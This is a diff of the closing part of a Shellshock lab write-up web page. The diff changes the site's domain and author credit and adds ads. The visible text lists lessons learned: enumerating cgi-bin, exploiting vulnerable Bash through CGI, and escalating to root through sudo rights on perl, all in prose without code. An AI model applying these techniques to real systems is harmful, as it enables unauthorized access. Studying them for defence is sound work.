+            <img src="https://www.hackerwasii.com/img/posts/shellshock/5.png" alt="" />
+          </p>
+          <p> </p>
+          <h2 id="lessons-i-learned">Lessons I learned</h2>
+          <ul>
+            <li>
+              <p>
+                I was stucked while enumerating the cgi-bin directory. While
+                enumerating the directory the tool was not putting
+                &ldquo;/&rdquo; at the end of the
+                <code>../cgi-bin</code> directory. The server was interpreting
+                it as a file instead of a directory and tool was showing 404
+                (resource not found).
+              </p>
+            </li>
+            <li>
+              <p>
+                I usually use gobuster tool, but i realized the
+                <a href="https://github.com/ffuf/ffuf">ffuf tool</a> is also a
+                really good fuzzer. I learned the usage of this tool in deep.
+                I&rsquo;ll try to make separate blog for this in future.
+              </p>
+            </li>
+            <li>
+              <p>
+                The web server was executing bash commands on the remote
+                system that was running a version of Bash that was vulnerable
+                to the Shellshock vulnerability. This bug allowed us to gain
+                access to the system. As a security or sys-admin we must know
+                this vulnerability and keep the system up-to-date. Even
+                popular shells like bash can be exploited.
+              </p>
+            </li>
+            <li>
+              <p>
+                We should always give less privileges to users, Giving the
+                sudo access permission to normal user to run perl command
+                allowed me to escalate the privileges to root level.
+              </p>
+            </li>
+          </ul>
+          <p> </p>
+          <p>
+            Thanks for reading this post, if you like my work you can support
+            by
+            <a href="https://www.buymeacoffee.com/hackerwasii">buying me a coffee</a>. ☕️
+          </p>
+        </div>
 
-    </div>
-    
-      
         <div class="pagination">
           <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
+            <span class="pagination__title-h">Read other posts</span>
             <hr />
           </div>
           <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="https://bhavsec.com/posts/boom-bashed/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">Boom Bashed 🧨💥</span>
-                </a>
-              </span>
-            
-            
-              <span class="button next">
-                <a href="https://bhavsec.com/posts/buff-freefloatftp/">
-                  <span class="button__text">FreeFloat FTP Buffer Overflow 🪣💦</span>
-                  <span class="button__icon">→</span>
-                </a>
-              </span>
-            
+            <span class="button previous">
+              <a href="https://www.hackerwasii.com/posts/boom-bashed/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Boom Bashed 🧨💥</span>
+              </a>
+            </span>
+
+            <span class="button next">
+              <a href="https://www.hackerwasii.com/posts/buff-freefloatftp/">
+                <span class="button__text">FreeFloat FTP Buffer Overflow 🪣💦</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
           </div>
         </div>
-      
-    
-
-    
-      
-        
-
-      
-    
-  </div>
-
       </div>
-
-      
-        <footer class="footer">
-  <div class="footer__inner">
-    
-      
-      <div class="copyright">
-        <span> 
-          © 2018-2022
-        </span>
-      </div>
-      <div>
-        <span>    
-        <span>
-        <a href="../../archive">archive</a>
-        &nbsp; 
-        </span>
-          <a href="../../newsletter">newsletter</a>
-        </span>   
-        &nbsp;      
-        <span>
-          <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
-        </span>
-        &nbsp;      
-        <span>
-          <a href="http://bhavsec.com/posts/index.xml" target=”_blank”>rss feed</a>
-        </span>
-
-      </div>
-
-    
-  </div>
-</footer>
-
-<script src="../../assets/main.js"></script>
-<script src="../../assets/prism.js"></script>
-
-      
     </div>
+    <!-- hackerwasii -->
+    <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9670252621494000" data-ad-slot="1081579313"
+      data-ad-format="auto" data-full-width-responsive="true"></ins>
+    <script>
+      (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+    <footer class="footer">
+      <div class="footer__inner">
+        <div class="copyright">
+          <span> © 2020-2022 Waseem Akram</span>
+        </div>
+        <div>
+          <span>
+            <span>
+              <a href="../../archive">archive</a>
+              &nbsp;
+            </span>
+            <a href="../../newsletter">newsletter</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="”_blank”">license</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="https://www.hackerwasii.com/posts/index.xml" target="”_blank”">rss feed</a>
+          </span>
+        </div>
+      </div>
+    </footer>
 
-    
-      
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-VY7WJZSQD0"></script>
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.dataLayer = window.dataLayer || [];
-	function gtag(){dataLayer.push(arguments);}
-	gtag('js', new Date());
-	gtag('config', 'G-VY7WJZSQD0', { 'anonymize_ip': false });
-}
-</script>
+    <script src="../../assets/main.js"></script>
+    <script src="../../assets/prism.js"></script>
+  </div>
+</body>
 
-    
-  </body>
 </html>
